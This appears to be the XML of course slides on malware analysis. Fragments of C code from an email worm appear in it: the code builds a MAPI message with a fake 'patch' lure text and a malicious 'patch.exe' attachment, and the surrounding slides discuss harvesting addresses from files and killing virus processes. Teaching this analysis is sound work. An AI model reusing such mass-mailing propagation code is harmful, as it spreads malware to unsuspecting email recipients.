              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> = subj;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mess.lpszNoteText</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> = "I send you this patch.\n"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>		"It corrects a bug into Internet Explorer and Outlook.\n\n"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>		"	Have a nice day. Best Regards.";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mess.lpRecips</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> = (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>MapiRecipDesc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>*)malloc(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MapiRecipDesc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if (!</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>mess.lpRecips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memset</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>mess.lpRecips</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>, 0,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MapiRecipDesc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mess.lpRecips</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>-&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>lpszName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>tos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mess.lpRecips</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>-&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>lpszAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>tos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mess.lpRecips</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>-&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>ulRecipClass</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> = MAPI_TO;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mess.nRecipCount</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> = 1;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mess.lpFiles</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> = (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>MapiFileDesc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>*)malloc(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MapiFileDesc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if (!</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>mess.lpFiles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	return;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memset</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>mess.lpFiles</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>, 0,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MapiFileDesc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//***********************************************************************************//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mess.lpFiles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lpszPathName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> = filename;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mess.lpFiles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en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>lpszFileName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> = "patch.exe";//this attachment is a malware!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//***********************************************************************************//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mess.nFileCount</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> = 1;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mess.lpOriginator</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> = &amp;from;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mSendMail</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(0, 0, &amp;mess, 0, 0);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>	free(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>mess.lpRecips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free(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>mess.lpFiles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0342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need to open the registry or create a new key?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9A86FB-4C7C-287F-5E7B-F9BCBD467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83762"/>
            <a:ext cx="12192000" cy="362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7418F8-6363-8889-D25A-9E699AC1E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85797"/>
            <a:ext cx="12192000" cy="5402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am confused about the way that the parameter passed to the function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LoadLibrary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and the function “</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0" err="1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InternetGetConnectedState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。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D2823F-725B-24AC-9303-334380BAB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003" y="3051175"/>
            <a:ext cx="7524997" cy="352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95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parameter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namefile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is a “*.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htm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or “*.doc” file…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 The function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GetMail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is to get the mail recipient address which is stored in the file named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namefile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”, but why?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3A0429-74FF-42E6-2296-F2DD0EE5C3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09504"/>
            <a:ext cx="6287984" cy="27682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0F9510F-7261-D14A-9636-28B3743724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653" y="2838547"/>
            <a:ext cx="5830347" cy="36392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76441EA-5F65-39E2-4CC5-67773F03E3B0}"/>
                  </a:ext>
                </a:extLst>
              </p14:cNvPr>
              <p14:cNvContentPartPr/>
              <p14:nvPr/>
            </p14:nvContentPartPr>
            <p14:xfrm>
              <a:off x="1104344" y="4080455"/>
              <a:ext cx="547200" cy="464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76441EA-5F65-39E2-4CC5-67773F03E3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5344" y="4071455"/>
                <a:ext cx="56484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3944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41537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function is used to stop the process of the virus, It is a simple method.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But if we do not know the name of virus, or the program cannot terminate the process by the API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TerminateProcess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because of lower-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authoriazation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3D75B1-59D8-ECA2-FD1A-639BB64C0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1338" y="3209533"/>
            <a:ext cx="10001003" cy="398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095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week07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quiz2 </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="170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 assignment4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2326</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>宽屏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微软雅黑</vt:lpstr>
      <vt:lpstr>新宋体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21</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2022-09-21T15:51:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2023-12-13T14:00:38Z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